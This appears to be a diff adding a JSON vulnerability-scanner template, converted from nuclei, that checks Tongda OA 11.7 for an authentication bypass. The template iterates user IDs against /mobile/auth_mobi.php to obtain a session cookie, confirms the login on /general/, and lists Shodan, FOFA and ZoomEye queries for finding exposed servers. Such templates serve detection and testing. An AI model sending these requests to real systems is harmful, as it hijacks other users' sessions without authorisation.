@@ -1,0 +1,138 @@
+{
+  "id": "tongda-auth-bypass",
+  "name": "Tongda OA 11.7 - Authentication Bypass",
+  "author": "HuTa0",
+  "severity": "HIGH",
+  "description": "Tongda OA is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD v11.7 has the interface query online user function, when the user is online, it will return PHPSESSION so that it can log in to the background system.\n",
+  "references": [
+    "https://s1xhcl.github.io/2021/03/13/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"
+  ],
+  "tags": [
+    "tongda",
+    "auth-bypass",
+    "fuzz"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"通达OA\"",
+    "shodan": "title:\"通达OA\"",
+    "zoomeye": "app:\"通达OA\""
+  },
+  "variables": {
+    "uid": [
+      "helpers/wordlists/numbers.txt"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /mobile/auth_mobi.php?isAvatar\u003d1\u0026uid\u003d{{uid}}\u0026P_VER\u003d0 HTTP/1.1\nHost: {{Hostname}}\n",
+        "GET /general/ HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "len(body_1) \u003d\u003d 0",
+            "!contains(body_1, \"RELOGIN\")",
+            "contains(header_1,\u0027PHPSESSID\u003d\u0027)",
+            "status_code_1 \u003d\u003d 200 \u0026\u0026 status_code_2 \u003d\u003d 200",
+            "contains(body_2,\u0027user_id:\u0027) \u0026\u0026 contains(body_2,\u0027user_name:\u0027) \u0026\u0026 contains(body_2,\u0027var loginUser\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "tongda-auth-bypass",
+    "info": {
+      "name": "Tongda OA 11.7 - Authentication Bypass",
+      "author": "HuTa0",
+      "severity": "high",
+      "description": "Tongda OA is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD v11.7 has the interface query online user function, when the user is online, it will return PHPSESSION so that it can log in to the background system.\n",
+      "reference": [
+        "https://s1xhcl.github.io/2021/03/13/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 200,
+        "shodan_query": "title:\"通达OA\"",
+        "fofa_query": "title\u003d\"通达OA\"",
+        "zoomeye_query": "app:\"通达OA\""
+      },
+      "tags": "tongda,auth-bypass,fuzz"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "uid": "helpers/wordlists/numbers.txt"
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /mobile/auth_mobi.php?isAvatar\u003d1\u0026uid\u003d{{uid}}\u0026P_VER\u003d0 HTTP/1.1\nHost: {{Hostname}}\n",
+          "GET /general/ HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "len(body_1) \u003d\u003d 0",
+              "!contains(body_1, \"RELOGIN\")",
+              "contains(header_1,\u0027PHPSESSID\u003d\u0027)",
+              "status_code_1 \u003d\u003d 200 \u0026\u0026 status_code_2 \u003d\u003d 200",
+              "contains(body_2,\u0027user_id:\u0027) \u0026\u0026 contains(body_2,\u0027user_name:\u0027) \u0026\u0026 contains(body_2,\u0027var loginUser\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
